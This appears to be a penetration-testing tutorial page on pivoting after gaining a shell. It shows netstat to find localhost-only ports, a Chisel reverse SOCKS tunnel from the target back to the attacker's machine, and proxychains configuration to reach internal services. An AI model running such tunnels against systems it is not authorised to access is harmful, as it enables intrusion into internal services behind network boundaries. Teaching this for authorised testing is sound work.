---
description: How to best communicate between you and everything on your target
---

# Networking

## Tunneling

Developers often only expose ports to the public when they need to, so unnecessary ports like MySQL are often only reachable from the inside. While for an attacker, that is a gold mine. So when you get a shell on a machine as a low-priviledge user, you might want to try and access these internal services.&#x20;

First off, you can view all the listening ports with the following command:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netstat -punta | grep -i listen
</strong>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
</code></pre>

In the above example, there are two ports that listen on `0.0.0.0`, meaning they allow connections from anywhere. But more interesting, there are two other ports that listen on `127.0.0.1`. This means they are only accessable from localhost, or the machine itself. It does not allow connections from the outside.&#x20;

So when you are on a machine with any ports open on the `127.0.0.1` address, you can now access them from the inside. We can run commands like `curl`, or `mysql` on the machine itself, but we would have to be lucky that those programs are installed, or that they can be downloaded. We also then work completely on the command line, and a graphical application like a browser would not work.&#x20;

This is where tunneling comes in. It allows you to create a path for the traffic where it is initially sent to your attacking machine, and then forwarded to the actual target. This allows you to use all of your own installed tools on that localhost port, in order to attack the target machine.&#x20;

### Chisel

{% embed url="https://github.com/jpillora/chisel" %}
A tool with a client and server to tunnel traffic to a target's localhost
{% endembed %}

Chisel is a useful tool that is very easy to set up. You simply need a **server** on your own machine, and a **client** on the target machine that connects to your server. Simply **copy** **a binary** from the [releases](https://github.com/jpillora/chisel/releases) to you and your target, and then the basic commands are as follows:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ chisel server -p 8080 --reverse  # Attacker: server
</strong>2023/01/01 00:00:00 server: Reverse tunnelling enabled
2023/01/01 00:00:00 server: Fingerprint raoElJaMVZlkiW9tCVXfLxR8IpBoQayS7wqa2ntl8sk=
2023/01/01 00:00:00 server: Listening on http://0.0.0.0:8080

<strong>$ ./chisel client $YOUR_IP:8080 R:socks  # Target: client
</strong>2023/01/01 00:00:00 client: Connecting to ws://10.10.10.10:8080
2023/01/01 00:00:00 client: Connected
</code></pre>

{% hint style="info" %}
**Note**: This requires two extra terminal screens to run these two commands, that both need to keep running to keep your connection alive
{% endhint %}

After the client connects, you should see a message like the following:

```
2023/01/01 00:00:00 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

This means the client successfully connected, and a tunnel was made. It tells you now that on your own `127.0.0.1:1080`, there now exists a socks proxy that you can use with all your tools.&#x20;

### Proxychains

{% embed url="https://github.com/haad/proxychains" %}
A tool that forces any TCP connection made by any given application to follow through a proxy
{% endembed %}

Proxychains is a tool that allows you to proxy existing tools to your new socks proxy from above. It just requires a tiny bit of configuration to make sure it knows to use the socks proxy we created on port `1080`. This is done using the `/etc/proxychains.conf` file. It might already contain some settings, but just change the `[ProxyList]` at the end to add your socks5 proxy:

```toml
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

With this set, you can now simply **prepend** `proxychains` to the command, and your localhost becomes the target localhost!

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ proxychains curl localhost:3000
</strong>[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:3000  ...  OK
&#x3C;!DOCTYPE html>
...

<strong>$ proxychains firefox --offline
</strong></code></pre>
